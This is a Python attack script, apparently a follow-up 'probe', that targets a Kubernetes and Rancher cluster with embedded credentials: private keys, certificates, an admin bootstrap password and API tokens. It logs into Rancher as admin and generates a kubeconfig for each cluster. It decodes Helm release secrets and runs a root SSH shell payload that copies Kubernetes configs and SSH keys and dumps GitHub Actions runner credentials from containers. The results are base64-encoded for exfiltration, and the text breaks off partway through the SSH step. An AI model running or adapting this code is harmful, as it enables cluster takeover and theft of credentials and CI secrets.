#!/usr/bin/env python3
# i10579 probe v2 (same single probe deployment, follow-up commit): finish the three
# sub-steps that v1 could not complete --
#  (a) in-cluster Rancher API over TLS-insecure transport: CATTLE_TOKEN/fleet-token
#      read-only /v3/clusters, exactly one bootstrap-password login, and one
#      generateKubeconfig per cluster;
#  (b) the 14 helm-release secrets with the correct double-base64 + gzip + JSON decode;
#  (c) github-nmz1 /etc/kubernetes/** read plus docker exec of the ARC actions-runner
#      containers for their .credentials/.runner/.config/gh/.ssh.
import os, sys, json, base64, gzip, hashlib, socket, ssl, http.client, subprocess, shutil, tempfile, time, re, urllib.parse

MODE = os.environ.get("I10579_MODE", "pod")
API_HOST, API_PORT = "10.17.1.1", 6443
CA_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR5RENDQXJDZ0F3SUJBZ0lVV1ZJUEFUanpHRlhsOVo0SklnQStDNGFyZmIwd0RRWUpLb1pJaHZjTkFRRUwKQlFBd2V6RUxNQWtHQTFVRUJoTUNRMDR4RWpBUUJnTlZCQWdUQ1Zwb1pXNW5XbWh2ZFRFU01CQUdBMVVFQnhNSgpXbWhsYm1kYWFHOTFNUk13RVFZRFZRUUtFd3BMZFdKbGNtNWxkR1Z6TVJvd0dBWURWUVFMRXhGTGRXSmxjbTVsCmRHVnpMVzFoYm5WaGJERVRNQkVHQTFVRUF4TUthM1ZpWlhKdVpYUmxjekFnRncweU5qRXdNamd3TWpBd01EQmEKR0E4eU1USTJNVEF3TkRBeU1EQXdNRm93ZXpFTE1Ba0dBMVVFQmhNQ1EwNHhFakFRQmdOVkJBZ1RDVnBvWlc1bgpXbWh2ZFRFU01CQUdBMVVFQnhNSldtaGxibWRhYUc5MU1STXdFUVlEVlFRS0V3cExkV0psY201bGRHVnpNUm93CkdBWURWUVFMRXhGTGRXSmxjbTVsZEdWekxXMWhiblZoYkRFVE1CRUdBMVVFQXhNS2EzVmlaWEp1WlhSbGN6Q0MKQVNJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dFUEFEQ0NBUW9DZ2dFQkFLTXd6T0thcUk0Y3pWMWJmY2ovQmVjcgpoRWQwL0w0QVlWSlg2WkM2dDNtQ0ZLN294bE80L3RaZVVLZEF2dlZuVGJxYXBTaU96dWkwb0NpZUdIeEZ5WGJpCmUyT1U5YzNTWTZjTE1ONUtQUGszdDk0aUloVkVtMWt3dzNjcmcveWhkUHZacGlSOXpaUDFTY045aVV5RlA3V3UKKzF0cm03bjBxdFo5Z3pwbEhtRTdyNndBTVRQV24zT0xHY3JCcXRRV3BVczhDaEsxSGhnZXR5dWt5bzd4aXZrRgpZS1RjckJnTzNJYS9hOExsUkkvU01pYUJ6VDlYM1RoRzdTdHVVUktQMTBLOFFpYzlOdlora1d6dDR3L0NiMDZkCjdUZVI1V1lKYzFJbHFPRnMzYm9tM1hPT3EwcFo2REdTZkx6a2t5U0ZaU0h0L3pDUlc3dFJ5cDl5dS84OWEyc0MKQXdFQUFhTkNNRUF3RGdZRFZSMFBBUUgvQkFRREFnRUdNQThHQTFVZEV3RUIvd1FGTUFNQkFmOHdIUVlEVlIwTwpCQllFRk8vSkUwcHFwcEk0ZkFLZVZsY1FIT3QvNU1FaU1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQmd6a010CkU4azljbHBiaXBhR203RmI1R1V1ak1qMmpzNFdyNCtZaWFYNFBlZDI4WXhYbkxLbENHUjc4a3ZxWGxMY0RKUmcKNzF3L2dUYXhxa29pdVRDeVJqVFhrQzFhZ29MaldWd1VYaTRYcVZDbjV5aXJjeGhrRjdNQ0F0TWFzNTVscW8xTwpVanhwdFdTODIrVjBYd0RxRmhuR1BhRWV5a2hIY3lwbldYZllXTUFXc0IxakFOS08zazNmaXk5NjVkODhnVFRyCkpqcGxsZVo1dE8xaTZaZFZEWmhmSGFLUGdocFVMQ01uVnVCMm9tZnZnMEVuSWtRZVNnODNoZEhzQVl5dW5iencKekR0N1F4eU50aEZhRDZoTnJpd3NvZGxYZkYvMURNeGNhWnphV3Rzak5pRzQ2T3VSVldnTllZUER3cXRKYWEybQpNYlpmaCtCY1p1QjlleXlGCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
CRT_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVCRENDQXV5Z0F3SUJBZ0lVYmpkOXlQNkkwOFNOOXpBM0sxUmZLbjkwa1h3d0RRWUpLb1pJaHZjTkFRRUwKQlFBd2V6RUxNQWtHQTFVRUJoTUNRMDR4RWpBUUJnTlZCQWdUQ1Zwb1pXNW5XbWh2ZFRFU01CQUdBMVVFQnhNSgpXbWhsYm1kYWFHOTFNUk13RVFZRFZRUUtFd3BMZFdKbGNtNWxkR1Z6TVJvd0dBWURWUVFMRXhGTGRXSmxjbTVsCmRHVnpMVzFoYm5WaGJERVRNQkVHQTFVRUF4TUthM1ZpWlhKdVpYUmxjekFnRncweU5qRXdNamd3TXpJeU1EQmEKR0E4eU1USTJNVEF3TkRBek1qSXdNRm93ZWpFTE1Ba0dBMVVFQmhNQ1EwNHhFakFRQmdOVkJBZ1RDVnBvWlc1bgpXbWh2ZFRFU01CQUdBMVVFQnhNSldtaGxibWRhYUc5MU1SY3dGUVlEVlFRS0V3NXplWE4wWlcwNmJXRnpkR1Z5CmN6RWFNQmdHQTFVRUN4TVJTM1ZpWlhKdVpYUmxjeTF0WVc1MVlXd3hEakFNQmdOVkJBTVRCV0ZrYldsdU1JSUIKSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXRpb3o2YzFXK0pIRzVKejlFSUlKcFdkYQowV1dwYXhOYk15TERITllMZVpWMzhra1Eza1Z6MHJ2L08zUkVPdGp6M1VWZERWcmtJQ2tueXhaWTFzVURvRmtoCnpPTjg5aCs4RUpoWlY1SWxxRDdLYy9aUzd2WjdpUGRGRDFaaTl1cVNEQ2lDUng5dHBiYjFEbW84a0hzNzRIcEwKc0cxR1Q1VHlPVTFRd093Mi9VRWVsUXY4Qk1FRzNIdFlYSVMwMndYeWZpVHhPbWg5MlVma09meEgreWo3TDNZeAp3MUlabG1sRFp3UnlpK3V1ZkU4NU5GaG9DRWV6Zm5UWFptT09LZUlyYTJSZnZudDd1VGFLYTBmL0plV0ZmWGFUCmFWM252UlFEQUU1RjJacXY0elRZd0Q0QS9maEQ2Uk1XUWpXQkMvRlIvK2VuQURWanpDWUVzcGp1T2QzeTF3SUQKQVFBQm8zOHdmVEFPQmdOVkhROEJBZjhFQkFNQ0JhQXdIUVlEVlIwbEJCWXdGQVlJS3dZQkJRVUhBd0VHQ0NzRwpBUVVGQndNQ01Bd0dBMVVkRXdFQi93UUNNQUF3SFFZRFZSME9CQllFRk51Si9pTFQzNE8rMmNOTUdVazN5cTlwCitweEJNQjhHQTFVZEl3UVlNQmFBRk8vSkUwcHFwcEk0ZkFLZVZsY1FIT3QvNU1FaU1BMEdDU3FHU0liM0RRRUIKQ3dVQUE0SUJBUUJQQnNJVVZHUGplRjVMcnJsdnJpM0RZNTRYZ0d1SlY5N0JlQ3UySFIzbVhkYW5wbkwzRHVyegpka3I1Ry85UEF6ayt6VDhVRlpqZnlDSFJjU2dncHpKYW1FcEg1THVQakVMS0JuUFJFL08zZ0l0VUh2am9IZE80CnJ4VFBSZ1krcWtnNUNXUFNpOEtRZ0cya2ZEaHVZYllwT1FsUmlXOUlaUUZoUXNvQm5naU1GaDkvTC83NnFjQ1QKcm9IVVA0VHBQNzB3M0tpN05oemdZc0NwbllmbU9UN0xWT2ptZVczaHZlbm1qZTR3VUI5cmRySTlNMWxwUEpqbwpzeUdlbHBYbkVzVmVCaldsc042NXU2WW5ITTJNVko1aXRaVUIrS2RmZWdrczNYZGIvOFcyTGJxcUxpeGNjUGZxCkEraTk4d3lNQ1BDVVRwVHZCNjF4a3Y0MkQxUDZZblRICi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
KEY_B64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBdGlvejZjMVcrSkhHNUp6OUVJSUpwV2RhMFdXcGF4TmJNeUxESE5ZTGVaVjM4a2tRCjNrVnowcnYvTzNSRU90anozVVZkRFZya0lDa255eFpZMXNVRG9Ga2h6T044OWgrOEVKaFpWNUlscUQ3S2MvWlMKN3ZaN2lQZEZEMVppOXVxU0RDaUNSeDl0cGJiMURtbzhrSHM3NEhwTHNHMUdUNVR5T1UxUXdPdzIvVUVlbFF2OApCTUVHM0h0WVhJUzAyd1h5ZmlUeE9taDkyVWZrT2Z4SCt5ajdMM1l4dzFJWmxtbERad1J5aSt1dWZFODVORmhvCkNFZXpmblRYWm1PT0tlSXJhMlJmdm50N3VUYUthMGYvSmVXRmZYYVRhVjNudlJRREFFNUYyWnF2NHpUWXdENEEKL2ZoRDZSTVdRaldCQy9GUi8rZW5BRFZqekNZRXNwanVPZDN5MXdJREFRQUJBb0lCQVFDV1RpNDFmT3VFLyt1SApXSTFxWUpHSys4T3d3VnhQOEZHdzJMNzYvUlhNeFdxSjdJWFJrS2JudTV6Mk5wSFJxSTlYQk5PcG9GUll3UHlICmtySE16QlNZNnRKNzF6eVZiRXZsdVg4R1JaMXl2QlNhS0NYMzdFSzBHYXJPNCsyV1pLZ0xCaVd3ZjVzZVA5N2wKZlB6cURmU3kzTlcxQmdVY3h2NHlEN3hRNHRiZ2tNTkhJc0UxUlBGTGpERUlJUUgzcGNzdnJ3SVc2ZVVMeHVGZApEOTRuUndQMHZjaGtuZVdVN3hIR0F3Z1hGaVFPR1FmZVVZREtlemFJN2JhY0ZtM2dkOG5rUng3R21sM29SREV5CnZvbVpMMnRRaFJnZEdQQWJta0duUFp0MWYyTk91c0daWnRVN3hjRE1ZYW00RGdOb1FhK2NNaUsveGhaOWlpMlEKN0RzM00yWlpBb0dCQVBBWFRCcUVMQ1VHc0E5dERNSm9MWGl5ODl5Nm51UXhSVzBtQXpGaUY2WHpuSFVVQnlqLwowUC9uT3liMEx0djFlRGlKbVl2YTJsTmlTTldYUk9zMzFEUHdLUHlLeU1YSkdkUGxxbHFyelBmMURNWHdlMjZnCkpiWm1FTzBtYldIa25ueVNKb0FuUzVBYk10aGg5RjI2TGhSWDJDT2RTUXNNL241R2lWMDljUXVWQW9HQkFNSTgKUzNpSlJ3dUtjcEdSK1N1ZXVrdldQL04vWjNPaURlMEhyODZlZFlrQi9hVWlsbFNYOUlQWFFEMmZKQWJKT2dYSApPWHFxL0p5OVpjQjZnRUtJNURJSzdaVE1ZanR4Y2NGZERNdFp1VDRGMlFuTzZMQW1YVVJRdXlPdzR1aCtVSmlLCk4zUzA3eTFEYUt6V01oT08zYmc3NjFTTUNSWW5KL2NCUEQzMHlVbTdBb0dCQUs2dUpKNitQMmdJLzV1Wm1jancKQnZWa0xlMFFrbjR3SXZVUXpRM204cEc1TnNJditpMm9RaVdOMVFtNGEwZDV4eWhMWkwzT1V6NkxxYlpOUXNWbwpieW9DdDY5V1FsRTB5V2ZVRnllMUM0SDBkb0NsUVFqeDE3NW5jRFU2MmlaNU1aNHNyM3BhSEs0U08rSVhFcllHCnVYUHZuYi83dGFNbXB4cTBzMGgxWllRcEFvR0FXSTlYTmRFWmxIaCtma0xaSWZ0UUk2Mi9JTTJSSkpiWjFKM3gKbWJxRUNvRGUza0VqMjlRZ3gxQUlXVkJMQTlFUjVIcU9pWkNXZHZ5Zi9SK2RoVGlYR3Y0Q2p4cVZHMWRCTDVHMgplSzBqR2RWZXZPc2JDdDJqSHJmVWE1U0dFTTB2QUMzYzFSaCtDTnc0U0wyc3ZXQWhWWlAwVzJzeDVXamEvdk1RClBZdHpqMnNDZ1lBUis2UUVXVm1waHdzRFJtenpjV0xIUzFrZ2dKTTNlWWVUNG1GTXhDZi9IRTcwR0J3a1RsOUcKWXJiMWV0d3pJWnpOYXJoYXpXZ0Z6LzUzU2VqbHpzOTcrcE1nZzRoWDQwTG03UytORXZ6dy9TbEtWenN0anNHNgorQTJpZ09tazNPMTlBbkJOVzJxRmNNR3h0a2ZKMmQ0Sm9TZDRDTlI2T2FsWXJPQ1ZrN2pDcFE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo="
ROOTKEY_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEwaUhpT0JXaVFmMVFDMTJ1ZnJGcTRJSndCaHhQSEx0MGJmbnIrTDBLbTRFeVZwNVVRNGwyCk5oejlhRlA3QTZ1THVVRTVTWTk5VENJSlZJOXFOYU9maHdCN3RvTTlma3ppbFJIZVdHSTlBT1dSRlZqSkwwY0pENVBiOEwKNzA2NkxQaGZ4OXZlNmM3MFpkQzdubjh5SU8rRS9nTTNTcjZwZ1FHbHhtWGl1aTRIMXdyNWxmTkwyckVndm5UOTJ4VHVnegpRRS8yT2w3TnBFV2YwYWZNakxBblZQMlAwN0NscGExem1DdVl1TlhUS2xSRHFMdU1zOFpQNXZwdUlQcHJkY2xzTjdNLzZGCml3c2hkUXc5NkZnQzEvWG8yMGM2UjFHRkdTSnB2Y0J3bExBVHhHd00zaDAvZUtadmVDeTNXT2s5Y1VWUjB3OHRjczFUelgKcGFOanVWM1EwSnkxeWdGdkVRc0xLZ0c0N3RDRFNwTzBpSEkxS2l4M21KMm5KcW9BYi8wVGRtM010TlpOWWxsbWhEYVRoMwpGa1BPUGRDL05HbTBvdWg5Q1FYVEFWMFd6aVl0L25maEVYUnJzTzlwNW5YTDlwL1hYN0lCNTVsQUJYazhXV09nTWhGSDdTCjZJcThjRDhVV0V5My9CTi9oNXRmT3dCVlI0TWgrMEdMSzZQYUFKKzdBQUFGaUNsb0ljOHBhQ0hQQUFBQUIzTnphQzF5YzIKRUFBQUdCQU5JaDRqZ1Zva0g5VUF0ZHJuNnhhdUNDY0FZY1R4eTdkRzM1Ni9pOUNwdUJNbGFlVkVPSmRqWWMvV2hUK3dPcgppN2xCT1VtUGZVd2lDVlNQYWpXam40Y0FlN2FEUFg1TTRwVVIzbGhpUFFEbGtSVll5UzlIQ1ErVDIvQys5T3VpejRYOGZiCjN1bk85R1hRdTU1L01pRHZoUDRETjBxK3FZRUJwY1psNHJvdUI5Y0srWlh6UzlxeElMNTAvZHNVN29NMEJQOWpwZXphUkYKbjlHbnpJeXdKMVQ5ajlPd3BhV3RjNWdybUxqVjB5cFVRNmk3akxQR1QrYjZiaUQ2YTNYSmJEZXpQK2hZc0xJWFVNUGVoWQpBdGYxNk50SE9rZFJoUmtpYWIzQWNKU3dFOFJzRE40ZFAzaW1iM2dzdDFqcFBYRkZVZE1QTFhMTlU4MTZXalk3bGQwTkNjCnRjb0JieEVMQ3lvQnVPN1FnMHFUdEloeU5Tb3NkNWlkcHlhcUFHLzlFM1p0ekxUV1RXSlpab1EyazRkeFpEemozUXZ6UnAKdEtMb2ZRa0Ywd0ZkRnM0bUxmNTM0UkYwYTdEdmFlWjF5L2FmMTEreUFlZVpRQVY1UEZsam9ESVJSKzB1aUt2SEEvRkZoTQp0L3dUZjRlYlh6c0FWVWVESWZ0Qml5dWoyZ0NmdXdBQUFBTUJBQUVBQUFHQkFNaFQwMFhpb2dqRlJWMUFsNDFpK09CR21pClBKTTBiU0V5S1JnL3hqeE13UmRIc05nSW5PYitzUTRpbG0vc1ExOUFQT0FaNTJkRjV6aUcrY05nWWpFbi95M3Y1VnlmY3gKdDBXa2ZsUEdmQi94dThvZEZkZkRvZ2krem95S2tCWmc1ZlQzakt6WTRiWmZYMjlCY2JiaC9tR09UTkRoWnRCRTNmMHpuOApnaFU2c3ZDNUhzNXMzeUVEZ3BMd0Y5K1g2ZmNkVGJKb1BwUTZWYlZ3emFLdkRwTXVZY3dkUnY4TXV0TzZtVHpvcFFGM3VnClQ4eDUySjYrN2dmbk1ieXc0R2V2ZUlpbW5sbGR1aGRrL0FhL1B4YlF1bEVxWnVhVXp1SmlGMGlvYjM1ZEJyS0l0V0VLQ0sKazBUR3g3dDJFV0lac09oRHQwNjlHaTRseFJYcHRpekVoZUd5SUl1Q0IyVG9oZG9talN3MG9PSWI2WnZTQ0tISW8yV25zYwo2amJXOWJjM2JQNW10NDBKeFVMeUphdVh0cWV2SkRIcUcwRE5TNWJLaWJlaE81UGlBM2dRNGM1dGVFUG4rakN5R2ZuWTQ2CkVKR3VGUy95S1RIMlZXOUgrbVprQk5wblhYTERSMmJ6ZmNRbFVYMm55REh0b3dlbU9vQjJhbWF0dllvb2QwTDhuNm1RQUEKQU1FQWhkajFJN0VCTGpkVnIvVDJNNlkzbmFxMmU0NWZORDNQTXppQWRrdkJuZXJGUHZubkd3eDBlK0lnVXAxRnZCYUpEZwpUM09tYlo1bXhlWG5VUG1xVG1MbkhlVGUvNzNhZEJXeDZaRFhHUU80TFJ4TXN4blNmL2xDR3dqTGxBWlBFQWQyS0RmZTZICk1ZZHJwVXZreVpkTkZ4NTJNekpVV3N0UzMrVnh5NjRxemFKQkNKSjVCKzFEQXFmOHl5Y0V3ZkFxN09iR3RjbVNDNHZrSFYKNUZReUZVQTNiMk9zNHdITG5mUHpZS1o5VzhlQjM1VmF1WFhCNk5LcSs4VlFya1BnTmtBQUFBd1FEc1JuU2NneGlDWEQvNApDM0JoeFJPQXM0OFJKRjlJZk14dEI0YWRFMUhYY2dZVk1idWNMS0RsZkplUDlCSzRod1JyMWdmdW02U3pqaE45NjUwS3d3Clg3UGJNTzVTTE01YjMzVTMvSnVBdWRHOVF2V05WWlladlRYejU2R1UxWGNJajc3OEpuQVhDZHN1Nzc5Yld6bjFZeUhMR0sKalRGdnpsZ3hkZUJyMnF5eVN6T3pZU1ovSDU1WGxBOUhqL1I0RVlpZ28vaDNmV3BZYVQ4VCtWaWF6RGJ0cFczdDI2dWkyVApKcFdOSGJ2UWFWUXZGTGxEdkN2ZjdhMmZHRjIybkpsYmNBQUFEQkFPT3N0NkQrY1lYcUpaZHJBR2tQQ21jYVpZL2lVbTZHCjJJRVU5Q3JuZCtTUEljWG52U29SQzFyb0tOdVlyaW5iNUdPV2orbGpRNWdMY2ZKR0xYMFlMcXBkbk9Db09TMklGeGt5d2EKcUllbkhHbEhPQmQ4SmovS1ZiTzRyZ09qYmdqNVdqZnB2c0RXT0lWaDEzU252dnpXT3RkRUU0SkN5UnE0c3JiV0pyTnlaUgpJbld4T3hGR0g3SFZlb3hIU1NFSDA0Y3dEMGZIUklWMzlOQUxuSFB0RnM2YkFmSjNTeCtKUUJUY1k5RGlFSUhpSk55eEFsClpGQ2ZGcCtKVmNvWnFtSFFBQUFBcHliMjkwUUVKWExUSXlBUUlEQkFVR0J3PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg=="
RANCHER_PW = "vrj7smfzwm2dlhqfg9hflvwx6w62pr95wlq2jl6j8sfbdpvkp7zcjp"
CATTLE_TOKEN = "mfhf6627wrz8xln82hxb7w4qbf9lwb5lr79dj5w8ltff7kzf8829qj"
FLEET_TOKEN = "u-mo773yttt4:xzwqb25lh5nbbkvtdmgvczf9xlj6qhdl44v8sv9bsrbcjpmmdgkmr6"

TOTAL = [0]
LIMIT = 2400000

def say(*a): print(*a, flush=True)

def b64chunks(tag, data, cap=None):
    if isinstance(data, str): data = data.encode("utf-8", "replace")
    if cap and len(data) > cap:
        data = data[:cap] + ("\n<<TRUNCATED orig=%d>>" % len(data)).encode()
    b = base64.b64encode(data).decode()
    if TOTAL[0] + len(b) > LIMIT:
        say("I10579V2SKIP %s size=%d total_cap" % (tag, len(b))); return
    TOTAL[0] += len(b)
    for i in range(0, len(b), 600):
        say("I10579V2B64 %s %d %s" % (tag, i // 600, b[i:i + 600]))
    say("I10579V2END %s %d %s" % (tag, len(data), hashlib.sha256(data).hexdigest()))

def emit_json(tag, obj, cap=400000):
    b64chunks(tag, json.dumps(obj, ensure_ascii=False, default=str), cap)

def write_file(path, b64, mode=0o600):
    d = base64.b64decode(b64)
    with open(path, "wb") as f: f.write(d)
    os.chmod(path, mode); return path

class H:
    def __init__(self, host, port=443, token=None, insecure=True, ca=None):
        self.host, self.port, self.token, self.insecure, self.ca = host, port, token, insecure, ca
    def req(self, method, path, body=None, timeout=25, accept="application/json"):
        if self.ca and os.path.exists(self.ca):
            ctx = ssl.create_default_context(cafile=self.ca)
        else:
            ctx = ssl.create_default_context()
        if self.insecure:
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=timeout)
        hdr = {"Accept": accept, "User-Agent": "i10579-probe2"}
        if self.token: hdr["Authorization"] = "Bearer " + self.token
        data = None
        if body is not None:
            data = json.dumps(body).encode(); hdr["Content-Type"] = "application/json"
        conn.request(method, path, body=data, headers=hdr)
        r = conn.getresponse(); b = r.read(); conn.close()
        return r.status, b

def rancher():
    out = {"attempts": []}
    base = None
    for host, port in (("10.106.75.65", 443), ("rancher.cattle-system.svc", 443), ("rancher.cattle-system.svc.cluster.local", 443)):
        try:
            h = H(host, port)
            st, b = h.req("GET", "/rancherversion", timeout=12)
            out["attempts"].append({"host": host, "status": st, "body": b[:300].decode("utf-8", "replace")})
            if st == 200:
                base = (host, port); break
        except Exception as e:
            out["attempts"].append({"host": host, "error": "%s: %s" % (type(e).__name__, e)})
    out["base"] = base
    emit_json("R2_PROBE", out, 30000)
    if not base: return
    host, port = base
    # 1) CATTLE_TOKEN (cluster agent token) read-only
    for label, tok in (("cattle_token", CATTLE_TOKEN), ("fleet_local_token", FLEET_TOKEN)):
        try:
            h = H(host, port, token=tok)
            st, b = h.req("GET", "/v3/clusters", timeout=30)
            rec = {"token": label, "status": st}
            try:
                d = json.loads(b)
                rec["count"] = len(d.get("data") or [])
                rec["clusters"] = [{"id": x.get("id"), "name": x.get("name"), "state": x.get("state"),
                                    "provider": x.get("provider"), "nodeCount": x.get("nodeCount")}
                                   for x in (d.get("data") or [])]
                if st != 200: rec["body"] = b[:400].decode("utf-8", "replace")
            except Exception:
                rec["body"] = b[:400].decode("utf-8", "replace")
            emit_json("R2_" + label.upper(), rec, 60000)
        except Exception as e:
            emit_json("R2_" + label.upper(), {"token": label, "error": "%s: %s" % (type(e).__name__, e)}, 10000)
    # 2) exactly one bootstrap-password login
    tok = None; login = {}
    try:
        h = H(host, port)
        st, b = h.req("POST", "/v3-public/localProviders/local?action=login",
                      {"username": "admin", "password": RANCHER_PW, "responseType": "json", "ttl": 60000}, timeout=30)
        login = {"status": st, "body": b[:1200].decode("utf-8", "replace")}
        if st in (200, 201):
            try: tok = json.loads(b).get("token")
            except Exception: pass
        login["token_prefix"] = (tok or "")[:24]
    except Exception as e:
        login = {"error": "%s: %s" % (type(e).__name__, e)}
    emit_json("R2_LOGIN", login, 20000)
    if not tok: return
    # 3) read-only cluster enumeration + one generateKubeconfig per cluster
    try:
        hr = H(host, port, token=tok)
        st, b = hr.req("GET", "/v3/clusters", timeout=30)
        d = json.loads(b)
        cid = [{"id": x.get("id"), "name": x.get("name"), "state": x.get("state"),
                "provider": x.get("provider"), "nodeCount": x.get("nodeCount"),
                "version": x.get("version"), "allocatable": x.get("allocatable"),
                "capacity": x.get("capacity")} for x in (d.get("data") or [])]
        emit_json("R2_CLUSTERS", {"status": st, "count": len(cid), "clusters": cid}, 150000)
    except Exception as e:
        emit_json("R2_CLUSTERS", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
        return
    for c in cid[:10]:
        cidv = c.get("id")
        safe = re.sub(r"[^A-Za-z0-9_.-]", "_", cidv or "x")
        try:
            hr = H(host, port, token=tok)
            st, b = hr.req("POST", "/v3/clusters/%s?action=generateKubeconfig" % cidv, {}, timeout=40)
            rec = {"id": cidv, "status": st}
            try: rec["config"] = json.loads(b).get("config", "")[:20000]
            except Exception: rec["body"] = b[:800].decode("utf-8", "replace")
            emit_json("R2_KUBECONFIG_" + safe, rec, 40000)
        except Exception as e:
            emit_json("R2_KUBECONFIG_" + safe, {"id": cidv, "error": "%s: %s" % (type(e).__name__, e)}, 10000)

HELM = [
    ("arc-systems", "sh.helm.release.v1.arc.v1"),
    ("cattle-fleet-local-system", "sh.helm.release.v1.fleet-agent-local.v1"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet-crd.v1"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v1"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v2"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v3"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v4"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v5"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v1"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v2"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v3"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v4"),
    ("cattle-system", "sh.helm.release.v1.rancher-webhook.v1"),
    ("cattle-system", "sh.helm.release.v1.rancher-webhook.v2"),
]

def helm(tmp):
    ca = write_file(os.path.join(tmp, "ca.crt"), CA_B64)
    crt = write_file(os.path.join(tmp, "client.crt"), CRT_B64)
    key = write_file(os.path.join(tmp, "client.key"), KEY_B64)
    ctx = ssl.create_default_context(cafile=ca); ctx.check_hostname = False
    ctx.load_cert_chain(crt, key)
    items = []
    for ns, name in HELM:
        rec = {"_ns": ns, "_name": name}
        try:
            conn = http.client.HTTPSConnection(API_HOST, API_PORT, context=ctx, timeout=90)
            conn.request("GET", "/api/v1/namespaces/%s/secrets/%s" % (ns, name),
                         headers={"Accept": "application/json", "User-Agent": "i10579-probe2"})
            r = conn.getresponse(); b = r.read(); conn.close()
            rec["status"] = r.status
            if r.status != 200:
                rec["err"] = b[:200].decode("utf-8", "replace"); items.append(rec); continue
            rel = (json.loads(b).get("data") or {}).get("release")
            if not rel:
                rec["error"] = "no release key"; items.append(rec); continue
            step1 = base64.b64decode(rel)
            step2 = base64.b64decode(step1)
            js = gzip.decompress(step2)
            jj = json.loads(js)
            ch = jj.get("chart") or {}
            rec.update({
                "name": jj.get("name"), "version": jj.get("version"), "namespace": jj.get("namespace"),
                "info": jj.get("info"),
                "chart_metadata": ch.get("metadata"),
                "chart_values": ch.get("values"),
                "config": jj.get("config"),
                "manifest_head": (jj.get("manifest") or "")[:2500],
                "hooks": [{"name": h.get("name"), "kind": h.get("kind"), "path": h.get("path")} for h in (jj.get("hooks") or [])],
                "release_json_len": len(js),
            })
        except Exception as e:
            rec["error"] = "%s: %s" % (type(e).__name__, e)
        items.append(rec)
        time.sleep(0.05)
    emit_json("HELM2", {"count": len(items), "items": items}, 800000)

HOST2 = r'''set -u
OUT=$(mktemp -d /tmp/i10579v2.XXXXXX) || exit 9
mkdir -p "$OUT/files"
MAN="$OUT/manifest.txt"; : > "$MAN"
collect() {
  f="$1"
  if [ -f "$f" ] && [ -r "$f" ]; then
    sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
    if [ "$sz" -gt 524288 ]; then echo "SKIP_BIG $f $sz" >> "$MAN"; return; fi
    mkdir -p "$OUT/files$(dirname "$f")" 2>/dev/null
    if cp -L -p "$f" "$OUT/files$f" 2>/dev/null; then echo "OK $f $sz" >> "$MAN"; else echo "FAIL $f" >> "$MAN"; fi
  fi
}
{
  echo "## etc-kubernetes"
  ls -laR /etc/kubernetes 2>&1 | head -120
  echo "## kubelet-conf"
  cat /etc/kubernetes/kubelet-conf.yml 2>&1 | head -80
  echo "## docker-ps"
  docker ps --format '{{.ID}} {{.Image}} {{.Names}}' 2>&1 | head -80
  echo "## docker-runner-exec"
  for id in $(docker ps --format '{{.ID}} {{.Image}}' 2>/dev/null | awk '/actions-runner/{print $1}' | head -15); do
    echo "--- container $id"
    timeout 10 docker exec "$id" sh -c 'id; hostname; ls -la /home/runner 2>/dev/null | head -20; echo "CRED:"; cat /home/runner/.credentials 2>/dev/null; echo; echo "RUNNER:"; cat /home/runner/.runner 2>/dev/null; echo; echo "GH:"; cat /home/runner/.config/gh/hosts.yml 2>/dev/null; echo; echo "SSH:"; ls -la /home/runner/.ssh 2>/dev/null; cat /home/runner/.ssh/id_* 2>/dev/null' 2>&1 | head -80
  done
} > "$OUT/cmds2.txt" 2>&1
for f in /etc/kubernetes/*.kubeconfig /etc/kubernetes/*.conf /etc/kubernetes/kubelet-conf.yml /etc/kubernetes/ssl/* /etc/kubernetes/manifests/* /root/.kube/config /root/.ssh/id_rsa; do
  [ -e "$f" ] && collect "$f"
done
tar czf "$OUT/host2.tgz" -C "$OUT" files manifest.txt cmds2.txt 2>/dev/null
sz=$(stat -c%s "$OUT/host2.tgz" 2>/dev/null || echo 0)
if [ "$sz" -gt 1000000 ]; then tar czf "$OUT/host2.tgz" -C "$OUT" manifest.txt cmds2.txt 2>/dev/null; fi
sz=$(stat -c%s "$OUT/host2.tgz" 2>/dev/null || echo 0)
echo "===I10579V2HOST_BEGIN $sz==="
base64 -w 0 "$OUT/host2.tgz"
echo
echo "===I10579V2HOST_END==="
rm -rf "$OUT"
'''

def host2(tmp):
    out = {"attempted": True}
    ssh = shutil.which("ssh")
    if not ssh:
        out["error"] = "no ssh client"; emit_json("HOST2_META", out, 10000); return
    try:
        kp = write_file(os.path.join(tmp, "root_id_rsa"), ROOTKEY_B64, 0o600)
